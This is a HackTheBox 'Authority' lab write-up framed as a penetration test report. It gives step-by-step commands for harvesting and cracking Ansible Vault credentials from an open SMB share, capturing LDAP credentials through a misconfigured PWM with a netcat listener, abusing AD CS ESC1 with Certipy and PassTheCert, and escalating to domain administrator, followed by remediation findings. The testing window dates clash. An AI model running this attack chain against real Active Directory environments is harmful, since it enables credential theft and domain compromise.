# HTB Authority - OSCP-Style Penetration Test Report

**Author:** randalltr

**Date:** 2026-4-2

---

## 0. Lesson Learned

When you're stuck and run out of ideas (but have AD + LDAP, and creds), try Certipy:

```
certipy-ad find -u user -p pass -target domain -vulnerable
```

---

## 1. Executive Summary

A penetration test was conducted against the Authority target system. The assessment identified multiple critical misconfigurations, including exposed credentials in configuration files, insecure application configuration, and vulnerable Active Directory Certificate Services (AD CS).

Initial access was achieved through credential harvesting from exposed SMB shares and Ansible configuration files. Further exploitation of a misconfigured Password Self Service (PWM) application allowed credential capture. Finally, privilege escalation to Domain Administrator was achieved through abuse of AD CS (ESC1).

---

## 2. Scope

- **Target:** 10.129.229.56
- **Environment:** HackTheBox Authority (Retired Machine)
- **Testing Window:** 2026-3-26 to 2025-4-2
- **Objective:** Full system compromise

---

## 3. Methodology

Testing followed a standard OSCP methodology:

- Information Gathering
- Enumeration
- Initial Access
- Post-Exploitation
- Privilege Escalation
- Proof of Compromise

---

## 4. Information Gathering

A full TCP-port scan was run with Nmap:

```
nmap 10.129.229.56 -p- -sCV -T4 -oA authority_tcp
```

Open ports:

- 53/tcp - domain
- 80/tcp - http (IIS 10.0)
- 88/tcp - kerberos
- 135/tcp - msrpc
- 139/tcp - netbios-ssn
- 389/tcp - ldap
- 445/tcp - microsoft-ds
- 464/tcp - kpasswd5
- 593/tcp - ncacn_http
- 636/tcp - ssl/ldap
- 3268/tcp - ldap
- 3269/tcp - ssl/ldap
- 5985/tcp - winrm
- 8443/tcp - https (Apache Tomcat)

The system is a Windows Domain Controller exposing LDAP, SMB, Kerberos, and WinRM services, indicating an Active Directory environment.

---

## 5. Enumeration

PWM running on port 8443 in configuration mode allows unauthenticated configuration access, indicating a serious misconfiguration. An error disclosed username `svc_ldap`.

SMB was enumerated anonymously:

```
smbclient -L //10.129.229.56 -N
```

Revealing the `Development` share accessible anonymously.

Files from the `Development` share were downloaded for offline analysis:

```
smbclient //10.129.229.56/Development -N -c 'recurse ON; prompt OFF; mget *'
```

---

## 6. Initial Access

Manually browsing the files revealed Ansible Vault Passwords:

```
Automation/Ansible/PWM/defaults/main.yml
```

Each of the Ansible credentials were saved to a file to convert to a crackable hash:

```
ansible2john pwm_admin_login.vault > pwm_admin_login.hash

ansible2john pwm_admin_password.vault > pwm_admin_password.hash

ansible2john ldap_admin_password.vault > ldap_admin_password.hash
```

The hashes were cracked with hashcat all revealing the same password `!@#$%^&*`:

```
hashcat -m 16900 -O -a 0 -w 4 credentials.hash /usr/share/wordlists/rockyou.txt
```

The vaults were decrypted with this cracked password:

```
cat pwm_admin_login.vault | ansible-vault decrypt

cat pwm_admin_password.vault | ansible-vault decrypt

cat ldap_admin_password.vault | ansible-vault decrypt
```

Revealing the following credentials:

```
svc_pwm

pWm_@dm!N_!23

DevT3st@123
```

The credentials `pWm_@dm!N_!23` work to login on the Configuration Manager and Configuration Editor.

Changing the LDAP server to attacker machine IP and starting a listener:

```
nc -lnvp 389
```

Captured the credentials:

```
lDaP_1n_th3_cle4r!
```

Credentials were validated with netexec:

```
netexec winrm authority.htb -u usernames.txt -p 'lDaP_1n_th3_cle4r!' --continue-on-success
```

Revealing WinRM access for user `svc_ldap`.

```
evil-winrm -i 10.129.229.56 -u svc_ldap -p 'lDaP_1n_th3_cle4r!'
```

Shell obtained for user `svc_ldap`.

---

## 7. Post-Exploitation

A vulnerable certificate template (ESC1) was identified:

```
certipy-ad find -u svc_ldap -p 'lDaP_1n_th3_cle4r!' -target authority.htb -vulnerable
```

---

## 8. Privilege Escalation

A machine account was created:

```
addcomputer.py authority.htb/svc_ldap:lDaP_1n_th3_cle4r! -computer-name newComputer -computer-pass P@ssword1 -dc-ip 10.129.229.56
```

A certificate was requested:

```
certipy-ad req -username 'newComputer$' -password P@ssword1 -ca AUTHORITY-CA -template CorpVPN -upn administrator@authority.htb
```

A certificate was obtained for the Administrator account.

The key and cert were separately written to file to use in the PassTheCert attack:

```
certipy-ad cert -pfx administrator_authority.pfx -nocert -out administrator.key

certipy-ad cert -pfx administrator_authority.pfx -nokey -out administrator.crt
```

The PassTheCert attack was deployed:

```
python PassTheCert/Python/passthecert.py -action ldap-shell -crt administrator.crt -key administrator.key -domain authority.htb -dc-ip 10.129.229.56
```

Resulting in a ldap-shell with limited commands.

The `svc_ldap` user was added to the `administrators` group.

```
add_user_to_group svc_ldap administrators
```

The WinRM shell was restarted and flags were obtained as `svc_ldap` user.

---

## 9. Proof of Compromise

**User Flag**: *REDACTED*

```
type C:\Users\svc_ldap\Desktop\user.txt
```

**Root Flag**: *REDACTED*

```
type C:\Users\Administrator\Desktop\root.txt
```

This confirms full system compromise.

---

## 10. Findings & Recommendations

### **Finding:** Exposed Credentials in Configuration Files

**Severity:** Critical

**Description:**
Credentials were stored in plaintext within configuration files accessible via SMB shares.

**Impact:**
Attackers could retrieve valid credentials and use them to gain unauthorized access to services.

**Recommendation:**
Remove plaintext credentials from configuration files, use secure credential storage mechanisms, and restrict access to sensitive files.

### **Finding:** Application Exposed in Configuration Mode Without Authentication

**Severity:** Critical

**Description:**
An application (e.g., PWM) was exposed in configuration mode without authentication, allowing modification of backend settings.

**Impact:**
Attackers could manipulate LDAP configurations and capture credentials, potentially leading to domain compromise.

**Recommendation:**
Disable configuration mode in production environments, enforce authentication for administrative interfaces, and restrict access to trusted users.

### **Finding:** Weak Credential Management and Reuse

**Severity:** High

**Description:**
Passwords were reused across multiple services and stored insecurely.

**Impact:**
Attackers could reuse compromised credentials to access additional services and escalate privileges.

**Recommendation:**
Implement strong password policies, enforce credential uniqueness, and ensure secure storage of authentication data.

### **Finding:** Vulnerable Active Directory Certificate Services Configuration (ESC1)

**Severity:** Critical

**Description:**
A certificate template allowed user-controlled subject alternative names (e.g., UPN), enabling abuse of Active Directory Certificate Services (ADCS).

**Impact:**
Attackers could request certificates impersonating privileged users such as Administrator, leading to full domain compromise.

**Recommendation:**
Restrict enrollment permissions on certificate templates, remove vulnerable templates, and audit ADCS configurations for misconfigurations.

### **Finding:** Excessive Machine Account Creation Privileges

**Severity:** Medium

**Description:**
Domain users were permitted to create machine accounts due to a non-restricted machine account quota.

**Impact:**
Attackers could create controlled machine accounts and leverage them in delegation or certificate-based attacks.

**Recommendation:**
Set `ms-DS-MachineAccountQuota` to 0 if not required and restrict machine account creation to authorized administrators only.

---

## 11. Appendix

Cracking Ansible Vault Passwords -
[https://www.bengrewell.com/cracking-ansible-vault-secrets-with-hashcat/](https://www.bengrewell.com/cracking-ansible-vault-secrets-with-hashcat/)

ESC1 Certificate Vulnerability Abuse -
[https://www.blackhillsinfosec.com/abusing-active-directory-certificate-services-part-one/](https://www.blackhillsinfosec.com/abusing-active-directory-certificate-services-part-one/)

PassTheCert Attack -
[https://github.com/AlmondOffSec/PassTheCert.git](https://github.com/AlmondOffSec/PassTheCert.git)